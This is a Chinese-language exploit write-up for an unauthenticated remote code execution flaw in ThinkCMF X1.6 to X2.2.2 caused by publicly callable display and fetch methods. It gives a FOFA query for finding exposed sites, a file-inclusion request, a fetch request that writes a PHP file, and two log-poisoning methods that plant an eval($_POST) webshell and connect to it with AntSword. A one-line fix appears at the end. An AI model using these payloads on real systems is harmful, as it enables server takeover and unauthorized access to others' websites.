# ThinkCMF 任意内容包含getshell漏洞

## 漏洞描述

ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展

每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时是如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本

**漏洞介绍**

远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码

## 漏洞影响

> ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2

## FOFA

> title="ThinkCMF"

## 漏洞分析



**环境搭建**

ThinkCMFX2.2.2下载链接：https://pan.baidu.com/s/1rK1-_BLmH1VPXsIUfr1VUw 提取码：wuhw

将下载好的ThinkCMF解压后放在WWW目录下，然后浏览器访问即可看到安装页面

![1](_v_images/ThinkCMF/1.png)

![2](_v_images/ThinkCMF/2.png)

安装好之后访问页面为

![图片](_v_images/ThinkCMF/3.png)

**漏洞分析**

首先打开index.php文件，查看程序的项目路径，可以看到项目路径在application目录下

![图片](_v_images/ThinkCMF/4.png)

在项目路径下找到入口分组的控制器类选择IndexController 控制器类打开，可以知道继承了HomebaseController，通过gma参数指定分组模块方法，这里可以通过a参数直接调用PortalIndexController父类(HomebaseController)中的一些权限为public的方法



![图片](_v_images/ThinkCMF/5.png)

![图片](_v_images/ThinkCMF/6.png)

可以看的的public方法里就有display()、fetch(),还有方法作用及参数含义

display函数 (**可以自定义加载模版，通过$this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配**) 的作用是加载模板和页面输出，所对应的参数为：templateFile为模板文件地址，charset模板字符集，contentType输出类型，content输出内容

![图片](_v_images/ThinkCMF/7.png)

templateFile参数会经过parseTemplate()方法处理
在applicationCommonControllerAdminbaseController.class.php的parseTemplate()方法如下



![图片](_v_images/ThinkCMF/8.png)

parseTemplate()方法作用：判断模板主题是否存在，当模板主题不存在时会在当前目录下开始查找，形成文件包含

构造的payload为 ：index.php?a=display&templateFile=README.md

![图片](_v_images/ThinkCMF/9.png)

这里fetch函数的三个参数分别对应模板文件，输出内容，模板缓存前缀。利用时templateFile和prefix参数可以为空，在content参数传入待注入的php代码即可



**漏洞复现**

1.通过构造a参数的display()方法，实现任意内容包含漏洞

- 

```
?a=display&templateFile=README.md
```

![图片](_v_images/ThinkCMF/10.png)

2.通过构造a参数的fetch()方法，在不需要知道文件路径的情况下就可以实现任意文件写入



- 

```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1.php','<?php phpinfo(); ?>')</php>
```

执行paylaod，如果页面是空白的，则说明可能写入成功



![图片](_v_images/ThinkCMF/11.png)

3.访问写入的文件1.php，发现成功写入文件

![图片](_v_images/ThinkCMF/12.png)

**ThinkCMF缓存getshell**

```
由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php
```

``

![图片](_v_images/ThinkCMF/13.png)

***\*有两种方式可以getshell\****

***\*第一种方法\****



- 

```
?a=display&templateFile=<?php file_put_contents('shell.php','<?php+eval($_POST["6666"]);?>');die();?>
```

![图片](_v_images/ThinkCMF/14.png)

发送请求，thinkphp生成的日志的格式为 年-月份-日期 (请求的日期)

- 

```
http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
```



![图片](_v_images/ThinkCMF/15.png)

可以看到已经成功创建了shell.php文件

![图片](_v_images/ThinkCMF/16.png)

然后使用蚁剑成功连接



![图片](_v_images/ThinkCMF/17.png)

**第二种方法**

发送以下请求

- 

```
http://target.domain/?a=display&templateFile=<?php eval($_POST["6666"]);?>
```

![图片](_v_images/ThinkCMF/18.png)

然后直接使用一句话管理工具连接

- 

```
http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
```

![图片](_v_images/ThinkCMF/19.png)

**修复方法**

将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符改为 protected